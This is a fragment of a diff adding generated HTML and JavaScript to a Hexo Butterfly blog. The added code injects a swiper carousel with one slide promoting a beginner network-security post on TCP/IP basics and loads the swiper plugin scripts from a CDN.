+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/netbase1.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="img/cover/net_sec/1_cover.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-04-30</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/netbase1.html&quot;);" href="javascript:void(0);" alt="">网络安全-网络应用基础1</a><div class="blog-slider__text">该系列教程旨在让初学者理解网络与网络安全的基本概念🥧本节讲述TCP/IP协议的内容及通信三要素</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/netbase1.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
